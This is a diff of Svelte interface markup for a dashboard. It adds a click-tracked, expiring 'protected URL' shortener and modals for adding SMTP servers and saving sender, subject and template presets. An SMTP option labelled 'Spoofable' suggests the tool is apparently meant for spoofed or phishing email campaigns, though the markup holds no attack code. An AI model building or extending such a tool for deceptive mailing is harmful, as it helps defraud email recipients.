+					<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{urlStats.active}</p>
+					<p class="text-[10px] text-[var(--muted-foreground)]">Currently active URLs</p>
+				</div>
+			</div>
+
+			<!-- URL list -->
+			<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
+				<div class="border-b border-[var(--border)] px-5 py-3 flex flex-wrap items-center justify-between gap-3">
+					<div class="flex items-center gap-2">
+						<LinkIcon size={14} class="text-[var(--text-accent)]" />
+						<p class="text-sm font-semibold text-[var(--foreground)]">Your Protected URLs</p>
+						<p class="text-[11px] text-[var(--muted-foreground)]">Private shortener — only you see and manage</p>
+					</div>
+					<div class="flex items-center gap-2">
+						<div class="relative">
+							<Search size={11} class="absolute left-2.5 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)]" />
+							<input bind:value={urlSearch} type="text" placeholder="Search URLs..." class="w-56 rounded-md border border-[var(--border)] bg-[var(--input)] py-1.5 pl-7 pr-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
+						</div>
+						<button onclick={fetchProtectedUrls} class="rounded-md border border-[var(--border)] p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--accent)]" aria-label="Refresh">
+							<RefreshCw size={12} />
+						</button>
+						<button onclick={() => (showAddUrl = true)} class="btn-accent flex items-center gap-1.5 px-3 py-1.5 text-xs">
+							<Plus size={12} />
+							Add URL
+						</button>
+					</div>
+				</div>
+
+				{#if filteredUrls.length === 0}
+					<div class="flex flex-col items-center justify-center py-16 text-center">
+						<LinkIcon size={36} class="mb-2 text-[var(--text-tertiary)]" />
+						<p class="text-sm font-semibold text-[var(--foreground)]">No protected URLs yet</p>
+						<p class="mt-1 text-xs text-[var(--muted-foreground)]">Click "Add URL" to create your first short link.</p>
+					</div>
+				{:else}
+					<div class="grid grid-cols-[2fr_2fr_80px_100px_100px_120px] gap-4 border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-5 py-2 text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">
+						<span>Short URL</span>
+						<span>Original URL</span>
+						<span>Clicks</span>
+						<span>Status</span>
+						<span>Created</span>
+						<span class="text-right">Actions</span>
+					</div>
+					<div class="max-h-[60vh] overflow-y-auto custom-scrollbar">
+						{#each filteredUrls as u (u.id)}
+							<div class="grid grid-cols-[2fr_2fr_80px_100px_100px_120px] items-center gap-4 border-b border-[var(--border-subtle)] px-5 py-3 hover:bg-[var(--accent)]/30">
+								<div class="min-w-0">
+									<p class="truncate font-mono text-xs text-[var(--foreground)]">/u/{u.shortCode}</p>
+									<button onclick={() => copyShort(u)} class="mt-0.5 inline-flex items-center gap-1 text-[10px] text-[var(--muted-foreground)] hover:text-[var(--text-accent)]">
+										{#if copiedShort === u.id}
+											<Check size={10} class="text-[var(--status-live)]" />
+											Copied!
+										{:else}
+											<Copy size={10} />
+											Copy full link
+										{/if}
+									</button>
+								</div>
+								<a href={u.originalUrl} target="_blank" rel="noopener" class="truncate text-xs text-[var(--text-accent)] hover:underline">{u.originalUrl}</a>
+								<span class="font-mono text-xs text-[var(--foreground)]">{u.clicks}</span>
+								<span class="inline-flex w-fit items-center rounded-md border px-2 py-0.5 text-[10px] font-medium {u.status === 'active' ? 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]' : 'border-[var(--border)] text-[var(--muted-foreground)]'}">
+									{u.status}
+								</span>
+								<span class="text-[11px] text-[var(--muted-foreground)]">{fmtDate(u.createdAt)}</span>
+								<div class="flex items-center justify-end gap-1">
+									<button onclick={() => toggleUrl(u)} class="rounded-md border border-[var(--border)] px-2 py-1 text-[10px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
+										{u.status === 'active' ? 'Deactivate' : 'Activate'}
+									</button>
+									<button onclick={() => deleteUrl(u)} class="rounded-md p-1 text-[var(--muted-foreground)] hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" aria-label="Delete">
+										<Trash2 size={11} />
+									</button>
+								</div>
+							</div>
+						{/each}
+					</div>
+				{/if}
+			</div>
+		</div>
+	{/if}
+</div>
+
+<!-- ===================== MODALS ===================== -->
+
+<!-- Add SMTP -->
+{#if showAddSmtp}
+	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (showAddSmtp = false)}>
+		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl" onclick={(e) => e.stopPropagation()}>
+			<div class="mb-4 flex items-center justify-between">
+				<h3 class="text-base font-semibold text-[var(--foreground)]">Add SMTP</h3>
+				<button onclick={() => (showAddSmtp = false)} class="rounded-lg p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--accent)]" aria-label="Close"><X size={16} /></button>
+			</div>
+			<div class="space-y-3">
+				<div>
+					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP host</label>
+					<input bind:value={newSmtpHost} type="text" placeholder="smtp.example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+				</div>
+				<div>
+					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP port</label>
+					<input bind:value={newSmtpPort} type="number" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+				</div>
+				<div>
+					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP username</label>
+					<input bind:value={newSmtpUser} type="text" placeholder="user@example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+				</div>
+				<div>
+					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP password</label>
+					<input bind:value={newSmtpPass} type="password" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+				</div>
+				<div class="flex items-center gap-4 pt-1">
+					<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
+						<input type="checkbox" bind:checked={newSmtpSSL} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
+						Use SSL
+					</label>
+					<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
+						<input type="checkbox" bind:checked={newSmtpSpoofable} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
+						Spoofable
+					</label>
+				</div>
+			</div>
+			<div class="mt-5 flex justify-end gap-2">
+				<button onclick={() => (showAddSmtp = false)} class="rounded-md border border-[var(--border)] px-4 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
+				<button onclick={addSmtp} class="btn-accent px-4 py-2 text-xs">Add</button>
+			</div>
+		</div>
+	</div>
+{/if}
+
+<!-- Save Preset -->
+{#if showSavePreset}
+	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (showSavePreset = false)}>
+		<div class="w-full max-w-sm rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
+			<h3 class="text-sm font-semibold text-[var(--foreground)]">Save as Preset</h3>
+			<p class="mt-1 text-xs text-[var(--muted-foreground)]">Save current SMTP, template, sender, and subject</p>
+			<input bind:value={presetName} type="text" placeholder="Preset name" class="mt-4 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+			<div class="mt-4 flex justify-end gap-2">
+				<button onclick={() => (showSavePreset = false)} class="rounded-md border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
+				<button onclick={savePreset} disabled={!presetName.trim()} class="btn-accent px-3 py-1.5 text-xs disabled:opacity-50">Save</button>
+			</div>
+		</div>
+	</div>
+{/if}
+
+<!-- Add URL -->
+{#if showAddUrl}
+	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (showAddUrl = false)}>
+		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
+			<h3 class="text-base font-semibold text-[var(--foreground)]">Create Protected URL</h3>
+			<div class="mt-4 space-y-3">
+				<div>
+					<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Original URL</label>
+					<input bind:value={newUrlOriginal} type="text" placeholder="https://example.com/page" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+				</div>
+				<div>
+					<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Domain (optional)</label>
+					<input bind:value={newUrlDomain} type="text" placeholder="links.example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+				</div>
+				<div>
+					<label for="newUrlExpires" class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Expires In (seconds)</label>
+					<input id="newUrlExpires" bind:value={newUrlExpires} type="number" min="0" step="60" placeholder="Leave empty for no expiration" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">e.g. 3600 = 1 hour, 86400 = 1 day</p>
+				</div>
+			</div>
+			<div class="mt-5 flex justify-end gap-2">
+				<button onclick={() => (showAddUrl = false)} class="rounded-md border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
+				<button onclick={addUrl} disabled={!newUrlOriginal.trim()} class="btn-accent px-3 py-1.5 text-xs disabled:opacity-50">Create URL</button>
+			</div>
+		</div>
+	</div>
+{/if}
